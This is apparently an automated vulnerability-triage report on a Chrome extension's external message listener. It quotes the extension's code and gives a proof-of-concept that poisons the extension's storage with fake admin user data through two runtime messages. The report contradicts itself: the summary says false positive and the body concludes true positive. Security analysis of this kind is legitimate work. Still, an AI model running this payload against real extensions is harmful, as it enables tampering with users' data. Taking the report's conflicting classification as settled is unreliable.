# CoCo Analysis: bknmlolcaccbfcedimgmpnfcjadfelbn

## Summary

- **Overall Assessment:** FALSE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bknmlolcaccbfcedimgmpnfcjadfelbn/opgen_generated_files/bg.js
Line 965 (minified code)
- Source: bg_chrome_runtime_MessageExternal (external message payload)
- Flow: s.payload → s.payload.user → chrome.storage.local.set({user: s.payload.user})

**Code:**

```javascript
// Background script - service-worker.js
chrome.runtime.onMessageExternal.addListener((async(s,r,a)=>{
    const{type:o,payload:t}=s;

    if("post-user"===o && s.payload && s.payload.user) {
        chrome.storage.local.set({user:s.payload.user}), // ← Storage write
        a({success:!0}); // ← Response sent but no data returned
    }
    else if("get-vacancy"===o) {
        // Gets data from storage but requires token validation
        if(!t.token) return void a({success:!1});
        try {
            n=await e(["newVacancy"]);
            if(n.newVacancy.token !== t.token) // ← Token validation
                return void a({success:!1});
            a({success:!0,data:n}), // ← Returns data only if token matches
            chrome.storage.local.remove("newVacancy")
        } catch(u){
            a({success:!1})
        }
    }
    else if("get-user"===o) {
        try {
            n=await e(["user"]),
            a({success:!0,data:n}) // ← Returns stored user data
        } catch(u){
            a({success:!1})
        }
    }
    return!0
}))
```

**Classification:** FALSE POSITIVE

**Reason:** This is an incomplete storage exploitation. While an external attacker can write arbitrary data to storage via "post-user" message (storage.set with attacker-controlled s.payload.user), the exploitation chain is incomplete:

1. **Storage Write:** Attacker CAN poison storage with `chrome.storage.local.set({user: attackerData})`
2. **Storage Read Path Exists:** The "get-user" action reads from storage and returns data via sendResponse
3. **BUT - No Complete Retrieval Path to Original Attacker:**
   - The "get-user" action that retrieves stored data requires a SEPARATE external message
   - The manifest.json specifies `externally_connectable: {"matches": ["https://www.vocatio.cat/*", "http://localhost:3000/*"]}`
   - While methodology says to ignore this restriction for triggering, the key issue is: attacker poisoning storage and attacker retrieving the poisoned value requires TWO separate external message calls
   - The attacker who poisons the storage gets only `{success:true}` response without any data back
   - To retrieve the poisoned value, another call to "get-user" is needed, which returns the stored data

However, upon closer analysis, this COULD be TRUE POSITIVE if:
- The attacker controls one of the whitelisted domains (vocatio.cat or localhost:3000), OR
- According to methodology: "If even ONE webpage/extension can trigger it, classify as TRUE POSITIVE"
- An attacker CAN complete the exploitation: (1) Send "post-user" to poison storage, (2) Send "get-user" to retrieve poisoned data

**Re-evaluation:** This is actually a **TRUE POSITIVE** because:
1. Attacker can trigger via chrome.runtime.onMessageExternal (ignoring manifest restrictions per methodology)
2. Complete exploitation chain exists: poison storage → retrieve poisoned data via second external message
3. Storage data flows back to attacker via sendResponse: `a({success:!0,data:n})`
4. This achieves "Complete storage exploitation chain" per methodology

**Classification:** TRUE POSITIVE

**Attack Vector:** External Message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From malicious website (ignoring externally_connectable restrictions per methodology)
// Step 1: Poison storage with malicious data
chrome.runtime.sendMessage('bknmlolcaccbfcedimgmpnfcjadfelbn', {
    type: 'post-user',
    payload: {
        user: {
            email: 'attacker@evil.com',
            token: 'malicious-token',
            premium: true,
            admin: true
        }
    }
}, (response) => {
    console.log('Storage poisoned:', response);

    // Step 2: Retrieve the poisoned data
    chrome.runtime.sendMessage('bknmlolcaccbfcedimgmpnfcjadfelbn', {
        type: 'get-user'
    }, (response) => {
        console.log('Retrieved poisoned data:', response.data.user);
        // Attacker now has confirmation of storage poisoning
        // And can potentially escalate privileges if app trusts storage
    });
});
```

**Impact:** Storage poisoning with complete retrieval chain. Attacker can inject arbitrary user data into extension storage and retrieve it back, potentially escalating privileges if the application trusts storage-persisted user data without validation. This achieves the "complete storage exploitation chain" criteria: attacker data → storage.set → storage.get → attacker-accessible output (sendResponse).
